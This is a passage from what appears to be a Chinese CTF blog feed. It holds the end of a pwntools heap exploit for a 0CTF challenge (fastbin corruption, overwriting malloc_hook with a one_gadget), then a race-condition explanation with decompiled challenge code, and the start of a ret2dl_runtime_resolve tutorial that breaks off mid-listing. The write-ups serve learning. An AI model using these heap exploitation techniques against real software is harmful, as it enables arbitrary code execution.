class="line">#------------------------------------------</span><br><span class="line"></span><br><span class="line">for i in range(1,4):  # 1 - 3</span><br><span class="line">    allocate(0x48)</span><br><span class="line">    update(i,0x47,&apos;3&apos;*0x47)</span><br><span class="line"></span><br><span class="line">allocate(0x58) # 4</span><br><span class="line">allocate(0x28) # 5                 // put chunk5&apos;s address  in the fastbins[0x30];</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">delete(5)</span><br><span class="line">allocate(0x58) # 5</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">update(5,0x48,&apos;\x00&apos;*0x38+p64(0x31)+p64(0x51))  # fake fd to fastbin</span><br><span class="line">allocate(0x28)</span><br><span class="line">update(6,0x20,&apos;\x00&apos;*0x18+p64(0x21))</span><br><span class="line">delete(1)</span><br><span class="line">update(10,0x8,p64(main_arena+0x10))</span><br><span class="line">allocate(0x48)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x48)</span><br><span class="line">update(8,0x48,&apos;\x00&apos;*0x40+p64(main_arena-0x38))  # edit topchunk upon malloc_hook</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x58)</span><br><span class="line">#print hex(libc.symbols[&apos;&apos;])</span><br><span class="line">update(9,0x20,&apos;\x00&apos;*0x10+p64(one_gadget)+p64(libc.symbols[&apos;svc_run&apos;]+0x42))</span><br><span class="line">allocate(0x58)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><em>整个过程特别复杂，尤其是看不到指针的情况下，与2018一样需要慢慢捋，最好在纸上记录chunk地址与idx；</em><br><em>堆的一些地方还是有盲区，理解不够细致</em></p><h1 id="zero-task"><a href="#zero-task" class="headerlink" title="zero task"></a>zero task</h1><p><em>这个是被做出来最多的pwn，条件竞争类型的，之前没有接触过，当时看到跑线程想到可能是这个，但是没去现学，不过还是得继续。</em></p><h2 id="race-condition"><a href="#race-condition" class="headerlink" title="race condition"></a>race condition</h2><p>竞争条件是系统中的一种反常现象，由于现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。</p><p>代码说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//myThreadTest</span><br><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;pthread.h&gt;  </span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int i = 1;  </span><br><span class="line">void *mythread1()  </span><br><span class="line">&#123;   </span><br><span class="line">    if(i == 1)&#123;</span><br><span class="line">    sleep(3);</span><br><span class="line">    if(i == 2)             </span><br><span class="line">    printf(&quot;hack it!\n&quot;);</span><br><span class="line">    else</span><br><span class="line">    printf(&quot;you can try again!\n&quot;);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">void *mythread2()  </span><br><span class="line">&#123;  </span><br><span class="line">    sleep(1);</span><br><span class="line">    i=2;      </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">int main(int argc, const char *argv[])  </span><br><span class="line">&#123;    </span><br><span class="line">    pthread_t id1,id2;  </span><br><span class="line">  </span><br><span class="line">    pthread_create(&amp;id1, NULL, (void *)mythread1,NULL);  </span><br><span class="line">    pthread_create(&amp;id2, NULL, (void *)mythread2,NULL);  </span><br><span class="line">     </span><br><span class="line">    pthread_join(id1,NULL);  </span><br><span class="line">    pthread_join(id2,NULL);  </span><br><span class="line">  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o test  -lpthread        // linux 默认库不包含pthread，所以编译时需要添加lpthread</span><br><span class="line"></span><br><span class="line">$ ./test </span><br><span class="line">hack it!</span><br></pre></td></tr></table></figure><p>这个例子比较简单，但是很清晰，可以说是两个并发流同时访问了对象i ，在线程一还未结束时（sleep(3)），线程三同时访问对象i并修改了i的值从而影响了线程一。</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>三个功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1. Add task&quot;);</span><br><span class="line">  puts(&quot;2. Delete task&quot;);</span><br><span class="line">  puts(&quot;3. Go&quot;);</span><br><span class="line">  return printf(&quot;Choice: &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>add 功能： 先输入task id 与 加解密选择，然后malloc(0x70)的空间存放数据；之后进入加解密函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Task id : &quot;, 0LL);</span><br><span class="line">idx = get_num();</span><br><span class="line">printf(&quot;Encrypt(1) / Decrypt(2): &quot;);</span><br><span class="line">method = get_num();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">signed __int64 __fastcall enc_dec(int method, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // rsi</span><br><span class="line">  task *v4; // [rsp+0h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+14h] [rbp-1Ch]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Key : &quot;, a2);</span><br><span class="line">  get_str2((__int64)v4-&gt;key, 32);</span><br><span class="line">  printf(&quot;IV : &quot;, 32LL);</span><br><span class="line">  get_str2((__int64)&amp;v4-&gt;IV, 16);</span><br><span class="line">  printf(&quot;Data Size : &quot;, 16LL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v5 = (unsigned int)get_num();</span><br><span class="line">  if ( (signed int)v5 &lt;= 0 || (signed int)v5 &gt; 0x1000 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *(_QWORD *)&amp;v4-&gt;size = (signed int)v5;</span><br><span class="line">  *(_QWORD *)&amp;v4[1].key[8] = EVP_CIPHER_CTX_new();</span><br><span class="line"></span><br><span class="line">  if ( method == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_EncryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, (__int64)v4-&gt;key, (__int64)&amp;v4-&gt;IV);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( method != 2 )</span><br><span class="line">      return 0LL;</span><br><span class="line">    v3 = EVP_aes_256_cbc();</span><br><span class="line">    EVP_DecryptInit_ex(*(_QWORD *)&amp;v4[1].key[8], v3, 0LL, v4-&gt;key, &amp;v4-&gt;IV);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v4-&gt;method = method;</span><br><span class="line">  v4-&gt;ptr = (__int64)malloc(*(_QWORD *)&amp;v4-&gt;size);                                         </span><br><span class="line">  if ( !v4-&gt;ptr )</span><br><span class="line">    exit(1);</span><br><span class="line">  printf(&quot;Data : &quot;, v3);</span><br><span class="line">  get_str2(v4-&gt;ptr, *(_QWORD *)&amp;v4-&gt;size);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数就是对id还有一点数据检验之后将之前申请的chunk free</p><p>go函数 通过一点检查，之后创建线程将之前的输入的task 跑起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Task id : &quot;);</span><br><span class="line"> v1 = get_num();</span><br><span class="line"> for ( arg = (void *)str; arg; arg = (void *)*((_QWORD *)arg + 13) )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( v1 == *((_DWORD *)arg + 0x18) )</span><br><span class="line">   &#123;</span><br><span class="line">     pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, arg);</span><br><span class="line">     return __readfsqword(0x28u) ^ v4;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>重点的start routine函数,开始便sleep(2)，算是比较明显的条件竞争漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn start_routine(void *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+14h] [rbp-2Ch]</span><br><span class="line">  __int128 v2; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v3; // [rsp+28h] [rbp-18h]</span><br><span class="line">  __int64 v4; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  v2 = (unsigned __int64)a1;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  v4 = 0LL;</span><br><span class="line">  puts(&quot;Prepare...&quot;);</span><br><span class="line">  sleep(2u);</span><br><span class="line">  memset(ptr_0, 0, 0x1010uLL);</span><br><span class="line">  if ( !(unsigned int)EVP_CipherUpdate(</span><br><span class="line">                        *(_QWORD *)(v2 + 88),</span><br><span class="line">                        ptr_0,</span><br><span class="line">                        &amp;v1,</span><br><span class="line">                        *(_QWORD *)v2,</span><br><span class="line">                        (unsigned int)*(_QWORD *)(v2 + 8)) )</span><br><span class="line">    pthread_exit(0LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + 1) += v1;</span><br><span class="line">  if ( !(unsigned int)EVP_CipherFinal_ex(*(_QWORD *)(v2 + 88), (char *)ptr_0 + *((_QWORD *)&amp;v2 + 1), &amp;v1) )</span><br><span class="line">    pthread_exit(0LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + 1) += v1;</span><br><span class="line">  puts(&quot;Ciphertext: &quot;);</span><br><span class="line">  sub_107B(stdout, (__int64)ptr_0, *((unsigned __int64 *)&amp;v2 + 1), 0x10uLL, 1uLL);</span><br><span class="line">  pthread_exit(0LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>知道条件竞争漏洞的存在，可以利用其泄露地址；虽然是存在加解密过程，但是因为知道是AES_256_CBC 加密，同时python具有这个加密模块，所以这个可以解决</p><p>同时还需要的是写地址，在申请add task时 ，每个task 会得到四个chunk 第一个和第四个分别是结构体的存储与data的存储；<br>第二三个结构体是加解密申请的结构体，大小分别为0xb0 与 0x110，其中有存放指针，key， 加密后的data；</p><p>通过伪造加解密的结构及利用tcache的特点将chunk分配到malloc_hook并写入one_gadget；</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;这次的0ctf真的溃不成军，看了一些题心态爆炸&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;babyheap&quot;&gt;&lt;a href=&quot;#babyheap&quot; class=&quot;headerlink&quot; title=&quot;babyheap&quot;&gt;&lt;/a&gt;babyheap&lt;/h1&gt;&lt;h2 id=&quot;题
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn1.4--ret2dl_runtime_resolve</title>
    <link href="http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/"/>
    <id>http://siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/</id>
    <published>2019-03-19T23:12:54.000Z</published>
    <updated>2019-03-24T05:35:26.413Z</updated>
    
    <content type="html"><![CDATA[<h1 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h1><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节头部表和其对应的节组成。</p><p>如果一个可执行文件参与动态链接，它的程序头部表将包含类型为PT_DYNAMIC的段，它包含.dynamic节。结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -d bof</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048358</span><br><span class="line"> 0x0000000d (FINI)                       0x8048624</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048278</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481d8</span><br><span class="line"> 0x0000000a (STRSZ)                      107 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   40 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048330</span><br><span class="line"> 0x00000011 (REL)                        0x8048318</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482f8</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482e4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><p>节中包含目标文件的所有信息。节的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Word sh_name;      // 节头部字符串表节区的索引</span><br><span class="line">    Elf32_Word sh_type;      // 节类型</span><br><span class="line">    Elf32_Word sh_flags;     // 节标志，用于描述属性</span><br><span class="line">    Elf32_Addr sh_addr;      // 节的内存映像</span><br><span class="line">    Elf32_Off  sh_offset;    // 节的文件偏移</span><br><span class="line">    Elf32_Word sh_size;      // 节的长度</span><br><span class="line">    Elf32_Word sh_link;      // 节头部表索引链接</span><br><span class="line">    Elf32_Word sh_info;      // 附加信息</span><br><span class="line">    Elf32_Word sh_addralign; // 节对齐约束</span><br><span class="line">    Elf32_Word sh_entsize;   // 固定大小的节表项的长度</span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ readelf -S bof</span><br><span class="line">There are 31 section headers, starting at offset 0x18a4:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        080483f0 0003f0 000232 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048624 000624 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048640 000640 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048674 000674 0000f4 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>几个重要的节：</p><ol><li>.rel.plt节是用于函数重定位，.rel.dyn节是用于变量重定位</li></ol><p>ida 观察如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048318 ; ELF REL Relocation Table /r_offset r_info</span><br><span class="line">LOAD:08048318                 Elf32_Rel &lt;8049FFCh,  306h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048320                 Elf32_Rel &lt;804A040h,  905h&gt; ; R_386_COPY stdin</span><br><span class="line">LOAD:08048328                 Elf32_Rel &lt;804A044h,  705h&gt; ; R_386_COPY stdout</span><br><span class="line">LOAD:08048330 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048330                 Elf32_Rel &lt;804A00Ch,  107h&gt; ; R_386_JMP_SLOT setbuf</span><br><span class="line">LOAD:08048338                 Elf32_Rel &lt;804A010h,  207h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:08048340                 Elf32_Rel &lt;804A014h,  407h&gt; ; R_386_JMP_SLOT strlen</span><br><span class="line">LOAD:08048348                 Elf32_Rel &lt;804A018h,  507h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:08048350                 Elf32_Rel &lt;804A01Ch,  607h&gt; ; R_386_JMP_SLOT write</span><br></pre></td></tr></table></figure><ol start="2"><li>.got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048380↑r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048380+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset setbuf        ; DATA XREF: _setbuf↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset strlen        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A018                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0804A01C _got_plt        ends</span><br></pre></td></tr></table></figure><ol start="3"><li>.dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info)。</li></ol><p>而根据定义有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; 8</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">    Elf32_Word st_name;     // Symbol name(string tbl index)</span><br><span class="line">    Elf32_Addr st_value;    // Symbol value</span><br><span class="line">    Elf32_Word st_size;     // Symbol size</span><br><span class="line">    unsigned char st_info;  // Symbol type and binding</span><br><span class="line">    unsigned char st_other; // Symbol visibility under glibc&gt;=2.2</span><br><span class="line">    Elf32_Section st_shndx; // Section index</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></p><p>read索引值为ELF32_R_SYM(0x207) = 0x207 &gt;&gt; 8 = 2。而Elf32_Sym[2]即保存着write的符号表信息。</p><p>并且ELF32_R_TYPE(0x207) = 7，对应R_386_JUMP_SLOT。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481D8 ; ELF Symbol Table</span><br><span class="line">LOAD:080481D8                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481E8                 Elf32_Sym &lt;offset aSetbuf - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;setbuf&quot;</span><br><span class="line">LOAD:080481F8                 Elf32_Sym &lt;offset aRead - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:08048208                 Elf32_Sym &lt;offset aGmonStart - offset byte_8048278, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:08048218                 Elf32_Sym &lt;offset aStrlen - offset byte_8048278, 0, 0, 12h, 0, 0&gt; ; 